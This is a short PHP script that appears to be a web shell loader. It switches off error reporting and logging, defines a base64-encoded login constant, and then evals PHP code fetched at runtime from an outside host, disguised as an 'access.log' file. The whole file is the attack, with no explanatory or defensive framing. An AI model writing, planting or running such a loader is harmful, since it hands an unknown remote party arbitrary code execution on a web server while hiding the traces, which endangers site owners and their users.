<?php
error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
date_default_timezone_set("Asia/Jakarta");
define('login', base64_decode('S05UTA=='));

eval('?>' . file_get_contents('http://anoaghost.github/files/php/access.log'));
?>
